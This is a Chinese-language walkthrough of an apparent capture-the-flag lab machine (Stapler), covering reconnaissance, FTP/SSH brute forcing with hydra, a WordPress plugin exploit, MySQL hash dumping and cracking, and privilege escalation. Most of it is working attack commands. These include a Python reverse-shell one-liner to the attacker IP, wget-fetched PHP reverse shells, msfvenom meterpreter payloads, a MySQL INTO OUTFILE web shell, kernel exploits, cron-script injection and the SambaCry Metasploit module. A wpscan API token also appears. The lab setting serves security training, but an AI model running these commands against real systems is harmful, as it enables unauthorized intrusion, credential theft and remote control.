1、nmap扫描存活IP

nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.37)


2、nmap枚举全端口扫描信息
nmap -sS -sV -A -T5 -p- 10.211.55.37

20/tcp    closed ftp-data   ---未开启
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
以及smb2利用！
可以看到有很多容易受到攻击的端口都开着，FTP、NetBIOS、MySQL和运行Web服务器（Apache HTTPD）的端口12380等等！


3、FTP匿名登录
anonymous
ftp 10.211.55.37
get note     ---下载note文件

里面是txt文本信息：
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
说将账号信息留存在FTP中，那么还有别的账号密码！

获得两个用户名：Elly、John


4、Enum4linux信息收集：139的Samba信息
这是一个开放的netbios-ssn，用smbclient来查看（属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源）！用Enum4linux枚举，这是一个用于枚举来自Windows和Samba系统的信息的工具。

enum4linux -a 10.211.55.37
-a   做所有参数选项枚举一遍

1）发现了20个用户信息
保存到user.txt信息中！
cat user.txt | cut -d '\' -f2 | cut -d ' ' -f1 > user_dayu.txt
将通过筛选剔除后，获得正常的用户名：user_dayu.txt

2）ok活跃信息
//10.211.55.37/kathy	Mapping: OK, Listing: OK
//10.211.55.37/tmp	Mapping: OK, Listing: OK

kathy和tmp两个信息非常活跃！可以用smbclient连接！

5、爆破FTP

hydra -L user_dayu.txt -P user_dayu.txt 10.211.55.37 ftp

[21][ftp] host: 10.211.55.37   login: SHayslett   password: SHayslett

ftp枚举：
ftp 10.211.55.37
SHayslett
SHayslett
dir
里面非常多的文件信息，download下来后没发现什么有用利用的！

6、爆破ssh

hydra -L user_dayu.txt -P user_dayu.txt 10.211.55.37 ssh

[22][ssh] host: 10.211.55.37   login: SHayslett   password: SHayslett

获得ssh登录账号密码！

ssh SHayslett@10.211.55.37   ---成功登录

到了这一步有非常多的提权方法，咱们继续分析该项目环境！


7、nc信息枚举666端口
发现这是一个文件！

nc 10.211.55.37 666 > dayu
file dayu   ---dayu: Zip archive data, at least v2.0 to extract 
这是一个zip压缩文件，解压看看！

└─# unzip dayu
Archive:  dayu
  inflating: message2.jpg
获得message2的jpg图片！

给了两个cookie值！留着！


8、枚举http 12380服务

访问：http://10.211.55.37:12380/

nikto -h http://10.211.55.37:12380/
/admin112233/
/blogblog/
/phpmyadmin/:
发现三个目录和robots.txt！还提示SSL Info，说明是ssl访问的！不然http访问都会重定向回来！


1）https://10.211.55.37:12380/admin112233/
回显：This could of been a BeEF-XSS hook ;)

2）https://10.211.55.37:12380/blogblog/
发现是个正常页面，丢到AWVS扫描！  ---扫描发现这是WordPress 4.2.2 多个漏洞

wpscan --url https://10.211.55.37:12380/blogblog/ --disable-tls-checks
--disable-tls-checks  ---因为会受到SSL对等证书/SSH错误临时用法！

https://wpscan.com/register  访问进入：

wpscan --url https://10.211.55.37:12380/blogblog/  -e u --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc --disable-tls-checks

扫描发现：blogblog/wp-content/存在该信息泄露！

在blogblog/wp-content/plugins/发现：
advanced_video_embed.php信息，存在wordpress advanced video
谷歌搜索：wordpress advanced video exploit   ---可以利用39646
或者：searchsploit wordpress advanced video
发现：php/webapps/39646.py

利用：cp /usr/share/exploitdb/exploits/php/webapps/39646.py .

https://10.211.55.37:12380/blogblog/

import ssl
ssl._create_default_https_context = ssl._create_unverified_context
参考：
https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error


因为是ssl访问，加入即可！加入后：
python 39646.py
然后访问：
https://10.211.55.37:12380/blogblog/wp-content/uploads
目录下会出现图片：221020610.jpeg

--no-check-certificate  ---下载ssl
wget --no-check-certificate https://10.211.55.37:12380/blogblog/wp-content/uploads/221020610.jpeg

└─# file 221020610.jpeg
221020610.jpeg: PHP script, ASCII text
这是一个php代码的txt文本！

cat 221020610.jpeg

define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');

获得mysql用户名密码：root/plbkac


9、mysql数据库枚举

mysql -uroot -pplbkac -h 10.211.55.37

show databases;
use wordpress
show tables;
desc wp_users;
select user_login,user_pass from wp_users;
或者select * from wp_users;


+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
| pHqghUme   | $P$BBzzy29vkQEUdNIMGnvY/PFhDomnEh/ |
+------------+------------------------------------+

awk拆分需要的信息：https://www.runoob.com/linux/linux-comm-awk.html
awk -F'|' '{print $3}' mysqlpass.txt > pass.txt

john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
发现：
$P$B7889EMq/erHIuZapMB8GEizebcIy9.:incorrect   ---对应john
incorrect   

或者访问：枚举
https://10.211.55.37:12380/phpmyadmin/
root
plbkac

----------------
10、wordpress后台getshell

https://10.211.55.37:12380/blogblog/wp-login.php
john
incorrect
成功登录！

Plugins-》 add New -》upload Plugin ：存在上传文件


*****后面可以用项目八  四个方法进行拿shell
------------------------------------------------------
方法1：
反弹shell：
cp /usr/share/webshells/php/php-reverse-shell.php .   ----复制phpshell到本文件夹
python -m SimpleHTTPServer 8081   ----开启http服务
http://10.211.55.36/imfadministrator/uploads/bf12807d791f.gif?cmd=wget%20http://10.211.55.19:8081/php-reverse-shell.php
wget下载phpwebshell到uoload目录！

nc -vlp 1234
https://10.211.55.37:12380/blogblog/wp-content/uploads/php-reverse-shell.php  ----访问
成功获得反弹shell！
----------------------
方法2：
weevely  


weevely generate passdayu dayu.php   ---生成dayu.php文件密码为passdayu
generate  ---生成新代理
mv dayu.php dayu.gif    ---然后头部加入GIF98a并改名文件为gif

然后上传文件，看源码ID：ff075cd8aeef
weevely http://10.211.55.36/imfadministrator/uploads/ff075cd8aeef.gif passdayu
成功获得shell，该shell很稳定！

------------------
方法3：webacoo   ---测试无法绕过waf！！！！！


webacoo -g -o dayu1.php
-g 生成后门代码（需要-o）
-o OUTPUT 生成的后门输出文件名

和方法2一样，加入GIF98a然后改名dayu1.gif，查看ID：

webacoo -t -u http://x.x/.login.php

-t 建立远程“终端”连接（需要-u）
-u URL 后门 URL 
------------------
方法4：  测试无法绕过waf！！！！！
Msf-php-维持shell

//生成webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.19 LPORT=4455 -f raw > ms.php

//监听
msfconsole
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST 10.211.55.19
set LPORT 4455
run

------------------
方法5：mysql INTO OUT文件上传     INTO OUT（写）

mysql -uroot -pplbkac -h 10.211.55.37

select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";

nc -vlp 10.211.55.19
https://10.211.55.37:12380/blogblog/wp-content/uploads/shell.php?cmd=ls
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.19",6677));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'



------------------------------------------------------

python -c 'import pty; pty.spawn("/bin/bash")'

11、内网信息枚举

Linpeas.sh信息枚举：******

1）用户信息枚举
JKanode:x:1013:1013::/home/JKanode:/bin/bash

peter信息：
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

2）数据库信息泄露：
/var/www/https/blogblog/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');

3）可写入sh文件
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
You can write script: /usr/local/sbin/cron-logrotate.sh
/usr/bin/gettext.sh

-rwxr-xr-x  1 root   root        4624 Feb 10  2016 gettext.sh


------------------------------------------------------

12、提权利用

1）内核提权-1
------------------------
40049是在64位提权的，这是32位系统linux！  --linux_x86-64/local/40049.c

searchsploit Linux Kernel 4.4.x   linux/local/39772.txt 可以利用
cp /usr/share/exploitdb/exploits/linux/local/39772.txt .

proxychains wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit   ---是存在compile.sh文件的

上传上去：
python -m SimpleHTTPServer 8082
wget http://10.211.55.19:8082/exploit.tar
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
chmod +x compile.sh
./compile.sh
ls    ----执行./doubleput
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
成功！

------------------------------------
2）内核提权-2
wget http://10.211.55.19:8081/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o dayu
chmod +x dayu
./dayu

------------------------------------
3）ssh登录内核提权

ssh SHayslett@10.211.55.37
SHayslett

在home目录下存在：
AParnell  CJoo  DSwanger  elly        IChadwick  JBare  JKanode  kai     LSolum2  mel    NATHAN  RNunemaker  SHAY       SStroud  www
CCeaser   Drew  Eeth      ETollefson  jamie      jess   JLipps   LSolum  MBassin  MFrei  peter   Sam         SHayslett  Taylor   zoe

30个用户！
整理排序下，写入home_user.txt进行爆破：

hydra -L home_user.txt -P home_user.txt 10.211.55.37 ssh

grep -rn "ssh"   ---枚举当前目录下存在ssh信息的内容

JKanode/.bash_history:6:sshpass -p thisimypassword ssh JKanode@localhost
JKanode/.bash_history:8:sshpass -p JZQuyIN5 peter@localhost

发现peter用户密码：
peter
JZQuyIN5
ssh peter@10.211.55.37
JZQuyIN5
登录进去发现这是zsh的shell！

ssh JKanode@10.211.55.37
thisimypassword


4）sudo提权  
用户信息枚举就发现peter用户存在sudo提权漏洞

sudo -l
User peter may run the following commands on red:
    (ALL : ALL) ALL

和前面项目一样，直接sudo提权！
sudo su   ---成功提权root

5）计划写入文件提权

可写入sh文件漏洞利用：
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
You can write script: /usr/local/sbin/cron-logrotate.sh
/usr/bin/gettext.sh

find / -name cronlog 2>/dev/null    ---查看计划任务日志信息
find / -writable 2>/dev/null   ---枚举所有可写入权限的文件
find / -perm -o+w -type f 2> /dev/null | grep /proc -v   ---枚举

find / -name logrotate* 2>/dev/null  ----查找和logrotate相关的文件信息
cat /etc/cron.d/logrotate
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
每五分钟运行一次cron-logrotate.sh！

插入代码：
echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit" >> /usr/local/sbin/cron-logrotate.sh
cat /usr/local/sbin/cron-logrotate.sh
等待五分钟.......

/tmp/exploit -p



13、sambacry 拿shell   ---利用随机化！
前面nmap扫出了信息：
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

searchsploit Samba 4.3.9
locate linux/remote/42084.rb
cp /usr/share/exploitdb/exploits/linux/remote/42084.rb .

这是CVE-2017-7494的漏洞！https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494

MSF可以利用！

msfconsole
search Samba   ---符合2017年的就几个
use exploit/linux/samba/is_known_pipename
set rhosts 10.211.55.37
set rport 139
run

https://github.com/joxeankoret/CVE-2017-7494/
proxychains git clone https://github.com/opsxcq/exploit-CVE-2017-7494.git


---------
知识拓展：
1）查询所有内核信息
uname -mra && cat /etc/*release*


2）Linux smbclient
https://steflan-security.com/vulnhub-stapler-1-walkthrough/  --菜鸟
Linux smbclient命令可存取SMB/CIFS服务器的用户端程序。

SMB与CIFS为服务器通信协议，常用于Windows95/98/NT等系统。smbclient(samba client)可让Linux系统存取Windows系统所分享的资源。


-L 显示服务器端所分享出来的所有资源。
smbclient -L //10.211.55.37
发现kathy和tmp：

smbclient ///kathy -I 10.211.55.37 -N
-I<IP地址> 指定服务器的IP地址
-N 不用询问密码

cd kathy_stuff
get todo-list.txt
cd backup
get vsftpd.conf
get wordpress-4.tar.gz

smbclient //dayu/tmp -I 10.211.55.37 -N
get ls

下载了四个文件！

I'm making sure to backup anything important for Initech, Kathy



















